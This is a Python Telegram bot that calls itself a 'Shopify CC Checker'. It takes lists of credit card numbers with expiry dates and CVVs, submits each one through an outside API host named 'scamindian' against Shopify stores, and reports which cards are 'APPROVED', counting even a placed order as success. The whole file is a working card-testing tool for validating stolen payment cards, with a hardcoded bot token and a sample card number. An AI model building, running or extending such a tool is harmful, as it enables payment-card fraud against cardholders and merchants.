import requests
import json
import time
import os
import re
import asyncio
from datetime import datetime
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler
from telegram.constants import ParseMode

# ============= CONFIG =============
BASE_URL = "https://scamindian-production.up.railway.app/shopify"
DEFAULT_SITE = "https://greatergoods-com.myshopify.com"

TOKEN = "8856624425:AAHJ1MlxVOGLrTDqmPjbetbyJOaomPS0gXA"

APPROVED_RESPONSES = ["ORDER_PLACED", "OTP_REQUIRED", "INCORRECT_CVC", "INCORRECT_CVV",
                      "INSUFFICIENT_FUNDS", "INCORRECT_ZIP", "INCORRECT_POSTAL_CODE"]

# Conversation States
CARDS, SITES, CHECKING = range(3)

cancel_flags = {}

# =================================

def parse_card_line(line: str):
    line = line.strip()
    if not line:
        return None
    parts = [p.strip() for p in line.split('|')]
    if len(parts) >= 4:
        cc = re.sub(r'\D', '', parts[0])
        mm = re.sub(r'\D', '', parts[1])
        yyyy = re.sub(r'\D', '', parts[2])
        cvv = re.sub(r'\D', '', parts[3])
        if len(cc) >= 13 and len(mm) == 2 and len(yyyy) >= 4 and len(cvv) >= 3:
            return f"{cc}|{mm}|{yyyy}|{cvv}"
    return None


def consultar_api(sitio: str, cc_data: str):
    if not sitio.startswith('http'):
        sitio = 'https://' + sitio
    params = {'site': sitio, 'cc': cc_data}
    try:
        r = requests.get(BASE_URL, params=params, timeout=25)
        return r.text, r.status_code
    except Exception as e:
        return f"Error: {str(e)}", 0


def procesar_respuesta(respuesta_text):
    try:
        data = json.loads(respuesta_text) if respuesta_text.startswith('{') else {"Response": respuesta_text}
        resp_type = data.get('Response', 'UNKNOWN')
        if resp_type in APPROVED_RESPONSES or data.get('Status') == True:
            return "✅ APPROVED", resp_type, str(data)
        return "❌ DECLINED", resp_type, str(data)
    except:
        return "❌ ERROR", "Parse Failed", respuesta_text


# ================== CONVERSATION HANDLERS ==================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    cancel_flags[user_id] = False
    await update.message.reply_text(
        "🛍️ <b>Welcome to Shopify CC Checker</b>\n\n"
        "Step 1: Send your credit cards (text or .txt file)\n"
        "Example: 4023590000204193|08|2032|416",
        parse_mode=ParseMode.HTML
    )
    return CARDS


async def receive_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    cards = []

    if update.message.document:
        file = await update.message.document.get_file()
        path = f"cards_{user_id}.txt"
        await file.download_to_drive(path)
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
        os.remove(path)
    else:
        lines = update.message.text.splitlines()

    for line in lines:
        clean = parse_card_line(line)
        if clean:
            cards.append(clean)

    if not cards:
        await update.message.reply_text("❌ No valid cards found. Please send again.")
        return CARDS

    context.user_data['cards'] = cards
    await update.message.reply_text(f"✅ Loaded <b>{len(cards)}</b> cards.\n\n"
                                    "Step 2: Send Sites (.txt file) or single site URL", 
                                    parse_mode=ParseMode.HTML)
    return SITES


async def receive_sites(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    sites = []

    if update.message.document:
        file = await update.message.document.get_file()
        path = f"sites_{user_id}.txt"
        await file.download_to_drive(path)
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            sites = [line.strip() for line in f if line.strip() and "myshopify" in line.lower()]
        os.remove(path)
    else:
        site = update.message.text.strip()
        if site:
            if not site.startswith("http"):
                site = "https://" + site
            sites = [site]

    if not sites:
        await update.message.reply_text("❌ No valid sites found. Using default.")
        sites = [DEFAULT_SITE]

    context.user_data['sites'] = sites
    await update.message.reply_text(f"✅ Loaded <b>{len(sites)}</b> site(s).\n\n"
                                    "Type /startcheck to begin checking.\n"
                                    "Use /cancel anytime to stop.", parse_mode=ParseMode.HTML)
    return CHECKING


async def start_checking(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    cards = context.user_data.get('cards', [])
    sites = context.user_data.get('sites', [DEFAULT_SITE])

    if not cards:
        await update.message.reply_text("No cards loaded. Start again with /start")
        return ConversationHandler.END

    await update.message.reply_text(f"🚀 Starting check on {len(cards)} cards...")
    cancel_flags[user_id] = False

    approved_count = 0

    for i, cc in enumerate(cards, 1):
        if cancel_flags.get(user_id):
            await update.message.reply_text("⛔ Checking Cancelled.")
            break

        for site in sites[:6]:  # Limit sites per card
            if cancel_flags.get(user_id):
                break
            resp_text, _ = consultar_api(site, cc)
            status, reason, full_resp = procesar_respuesta(resp_text)

            if "APPROVED" in status:
                approved_count += 1
                await update.message.reply_text(
                    f"✅ <b>APPROVED</b> #{i}\n"
                    f"Card: <code>{cc}</code>\n"
                    f"Site: {site}\n"
                    f"Reason: {reason}\n"
                    f"Response: <code>{full_resp[:450]}</code>",
                    parse_mode=ParseMode.HTML
                )
                break
            else:
                await update.message.reply_text(
                    f"❌ Declined #{i}\nCard: <code>{cc[:12]}...</code>\nReason: {reason}",
                    parse_mode=ParseMode.HTML
                )

        time.sleep(0.7)

    await update.message.reply_text(f"✅ Process Finished!\nApproved: {approved_count}/{len(cards)}")
    return ConversationHandler.END


async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    cancel_flags[user_id] = True
    await update.message.reply_text("⛔ Operation Cancelled.")
    return ConversationHandler.END


def main():
    app = Application.builder().token(TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            CARDS: [MessageHandler(filters.TEXT | filters.Document.TEXT, receive_cards)],
            SITES: [MessageHandler(filters.TEXT | filters.Document.TEXT, receive_sites)],
            CHECKING: [CommandHandler('startcheck', start_checking)],
        },
        fallbacks=[CommandHandler('cancel', cancel)]
    )

    app.add_handler(conv_handler)
    app.add_handler(CommandHandler('cancel', cancel))

    print("🚀 Advanced Shopify CC Bot Started (with conversation flow)")
    app.run_polling()


if __name__ == "__main__":
    main()
